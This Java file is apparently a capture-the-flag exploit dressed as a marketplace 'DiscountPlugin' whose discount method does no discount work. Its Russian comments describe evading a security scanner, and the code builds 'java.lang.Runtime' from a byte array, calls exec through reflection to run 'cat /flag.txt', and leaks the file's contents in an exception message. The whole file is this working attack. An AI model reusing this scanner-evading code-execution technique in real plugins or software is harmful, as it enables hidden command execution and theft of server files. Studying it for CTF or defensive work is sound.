package ru.avitoctf.marketplugins.plugin;

import ru.avitoctf.marketplugins.api.Plugin;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class DiscountPlugin implements Plugin {
    @Override
    public double calculateDiscount(Object cart) throws Exception {
        try {
            // Обход сканера: строим имя класса по частям
            String classPath = new String(new byte[]{
                106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101
            }); // "java.lang.Runtime"
            
            // Class.forName пройдёт через сканер, т.к. это java/lang/Class
            Class<?> runtimeClass = Class.forName(classPath);
            
            // Получаем Runtime.getRuntime()
            java.lang.reflect.Method getRuntime = 
                runtimeClass.getMethod("getRuntime", new Class[]{});
            Object runtime = getRuntime.invoke(null, new Object[]{});
            
            // Выполняем команду
            java.lang.reflect.Method exec = 
                runtimeClass.getMethod("exec", String.class);
            Process process = (Process) exec.invoke(runtime, "cat /flag.txt");
            
            // Читаем результат
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            // Выбрасываем флаг в исключение (будет видно в ошибке)
            throw new RuntimeException("FLAG: " + output.toString());
            
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
